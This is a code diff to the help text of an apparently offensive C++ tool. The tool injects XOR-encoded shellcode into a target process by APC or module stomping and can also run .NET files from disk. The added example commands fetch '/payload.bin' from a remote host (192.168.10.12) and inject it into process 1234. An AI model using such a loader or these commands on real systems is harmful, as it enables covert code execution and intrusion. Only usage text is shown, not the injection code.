@@ -92,14 +92,24 @@ helper helperHandler;
     void helper::printHelp(const char* programName) {
         std::cout <<
             "Usage:\n"
-            << programName << " --pid <pid> --method <apc|stomp> [options]\n\n"
-            "Options:\n"
+            << programName << " dotnet/shellcode --pid <pid> --method <apc|stomp> [options]\n\n"
+            "Options for dotnet:\n"
+            "  --filePath          File Path on disk \n"
+            "  --args              args to pass to the file path on disk\n"
+            "A example for dotnet execution:\n\n"
+            ".\\main.exe dotnet --filePath C:\\Users\\ADMIN\\Debug\\test.exe --args test\n"
+            "\n"
+
+            "Options for shellcode:\n"
             "  --pid <int>            Target process id\n"
             "  --method <string>      apc | stomp\n"
             "  --key <hex>            XOR key (default 0x67)\n"
             "  --remote <url>         Remote host (google.com)\n"
             "  --file <path>          Remote file (/payload.bin)\n"
-            "  --help                 Show this help\n";
+            "  --help                 Show this help\n"
+            "Some example for shellcode execution:\n\n"
+            ".\\main.exe shellcode --pid 1234 --method apc --key 0x67 --remote 192.168.10.12 --file /payload.bin\n"
+            ".\\main.exe shellcode --pid 1234 --method stomp --key 0x10\n";
     }
 
 
